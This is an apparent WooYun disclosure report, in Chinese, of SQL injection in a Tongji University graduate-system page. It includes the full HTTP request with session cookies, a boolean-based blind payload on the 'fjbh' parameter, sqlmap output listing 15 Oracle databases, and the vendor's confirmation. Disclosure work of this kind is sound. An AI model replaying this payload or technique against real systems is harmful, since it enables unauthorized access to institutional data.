wybug_title: 同济大学某站SQL注射(影响大量用户安全)
wybug_detail: 漏洞详情 披露状态：   									2015-08-17：	细节已通知厂商并且等待厂商处理中									2015-08-18：	厂商已经确认，细节仅向厂商公开									2015-08-28：	细节向核心白帽子及相关领域专家公开									2015-09-07：	细节向普通白帽子公开									2015-09-17：	细节向实习白帽子公开									2015-10-02：	细节向公众公开  简要描述： http://yjsxt.tongji.edu.cn:80/epstar/web/swms/mainframe/home/service/DownloadGGFJ.jsp?fjbh=FJ020201415086096235登录该系统后，某些页面存在SQL注射,不仅仅包括所提交页面,请自查 详细说明：  GET /epstar/web/swms/mainframe/home/service/DownloadGGFJ.jsp?fjbh=FJ020201415086096235 HTTP/1.1Host: yjsxt.tongji.edu.cnProxy-Connection: keep-aliveAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36Accept-Encoding: gzip, deflate, sdchAccept-Language: zh-CN,zh;q=0.8Cookie: Hm_lvt_d5a76608e07e4903e91fe94d34b3cc0d=1436184127,1438050958,1438505913,1438666374; JSESSIONID=0000bJaQqMLfmgeleOXxPSE_5aN:15af19u1k; amlbcookie=02; iPlanetDirectoryPro=AQIC5wM2LY4SfcwyGoFeeS8grXw1S64LeP39s4l0%2Fh1e7Tk%3D%40AAJTSQACMDI%3D%23   漏洞证明：  sqlmap identified the following injection points with a total of 59 HTTP(s) requests:---Parameter: fjbh (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: fjbh=FJ020201415086096235' AND 8009=8009 AND 'JnDr'='JnDr---web application technology: Apache 2.0.63back-end DBMS: Oraclesqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: fjbh (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: fjbh=FJ020201415086096235' AND 8009=8009 AND 'JnDr'='JnDr---web application technology: Apache 2.0.63back-end DBMS: Oracleavailable databases [15]:[*] CTXSYS[*] DS_SUNGARD[*] EXFSYS[*] FM3EXG[*] MDSYS[*] MINDSDB[*] OLAPSYS[*] ORACLEDBA[*] SYS[*] SYSTEM[*] USR_GXSJ_NEW[*] USR_GXSJJ[*] USR_RS[*] USR_SRNEW_TJDATA[*] USR_YJS_APP   修复方案：  过滤即可   版权声明：转载请注明来源 BeenQuiver@乌云
wybug_reply: 漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-08-18 15:49 厂商回复： 漏洞确实存在，感谢提醒！ 最新状态： 暂无
